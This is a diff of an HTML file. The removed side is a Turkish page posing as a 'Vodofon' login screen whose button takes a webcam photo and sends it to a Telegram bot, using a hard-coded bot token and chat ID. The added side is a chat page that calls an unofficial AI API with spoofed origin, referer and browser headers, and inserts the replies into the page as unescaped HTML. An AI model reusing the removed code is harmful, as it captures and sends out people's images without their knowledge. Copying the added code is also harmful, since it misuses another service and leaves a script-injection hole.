@@ -1,83 +1,141 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vodofon Giriş Ekranı</title>
-<link rel="stylesheet" href="styles.css">
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: #f00; /* Arka plan rengi kırmızı */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-  }
-
-  button {
-    padding: 20px 40px; /* Butonun boyutunu büyütmek için padding */
-    background-color: #ff0; /* Sarı renkli buton */
-    color: #000; /* Buton metni rengi */
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-    font-size: 18px; /* Buton metni boyutu */
-  }
-
-  button:hover {
-    background-color: #ffd700; /* Sarı rengin biraz daha koyusu */
-  }
-</style>
-</head>
-<body>
-<button onclick="takePhotoAndSend()">BANABAS😁</button>
-
-<script>
-function takePhotoAndSend() {
-  // Kamera izni iste ve fotoğrafı çekip bota gönder
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(function(stream) {
-      var video = document.createElement('video');
-      document.body.appendChild(video);
-      video.srcObject = stream;
-      video.play();
-
-      video.addEventListener('canplay', function() {
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        var context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var imgData = canvas.toDataURL('image/jpeg');
-
-        // Fotoğrafı binary olarak gönder
-        var binaryData = atob(imgData.split(',')[1]);
-        var arrayBuffer = new ArrayBuffer(binaryData.length);
-        var uint8Array = new Uint8Array(arrayBuffer);
-        for (var i = 0; i < binaryData.length; i++) {
-          uint8Array[i] = binaryData.charCodeAt(i);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Chat</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f1f1f1;
         }
 
-        // Fotoğrafı FormData nesnesiyle gönder
-        var formData = new FormData();
-        formData.append('chat_id', '6070918315'); // Sizin chat ID'niz
-        formData.append('photo', new Blob([uint8Array], { type: 'image/jpeg' }));
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot6731167876:AAFYltZa6qZakKaBk4Xgmu8zX05vCTGbTQE/sendPhoto');
-        xhr.send(formData);
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
 
-        // Kamera akışını durdur
-        stream.getTracks().forEach(track => track.stop());
-        document.body.removeChild(video);
-      });
-    })
-    .catch(function(err) {
-      console.error('Kamera erişimi reddedildi:', err);
-    });
-}
-</script>
+        #chatOutput {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            min-height: 200px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+
+        .input-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        input[type="text"] {
+            width: calc(100% - 80px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px 0 0 5px;
+        }
+
+        #sendButton {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 0 5px 5px 0;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        #sendButton:hover {
+            background-color: #45a049;
+        }
+
+        .code {
+            background-color: #f9f9f9;
+            padding: 10px;
+            margin-top: 10px;
+            border-left: 4px solid #4CAF50;
+        }
+
+        #copyButton {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        #copyButton:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="chatOutput"></div>
+        <div class="input-container">
+            <input id="userInput" type="text" placeholder="Enter your message...">
+            <button id="sendButton" onclick="sendMessage()">Send</button>
+        </div>
+    </div>
+
+    <script>
+        function sendMessage() {
+            var userInput = document.getElementById("userInput").value;
+            var chatOutput = document.getElementById("chatOutput");
+
+            var headers = {
+                'authority': 'api.aichatos.cloud',
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
+                'content-type': 'application/json',
+                'origin': 'https://chat.yqcloud.top',
+                'referer': 'https://chat.yqcloud.top/',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'cross-site',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            };
+
+            var json_data = {
+                'prompt': userInput,
+                'userId': '#/chat/1714538755256',
+                'network': true,
+                'system': '',
+                'withoutContext': false,
+                'stream': false,
+            };
+
+            fetch('https://api.aichatos.cloud/api/generateStream', {
+                method: 'POST',
+                headers: headers,
+                body: JSON.stringify(json_data),
+            })
+            .then(response => response.text())
+            .then(data => {
+                var responseText = data.includes("`python") ? data.split("```python")[1].split("```")[0] : data.includes("```") ? data.split("```")[1].split("```")[0] : data;
+                var hr = "<hr>";
+                var codeBlock = '<div class="code">' + responseText + '</div>';
+                chatOutput.innerHTML += hr + codeBlock + hr;
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
 </body>
 </html>
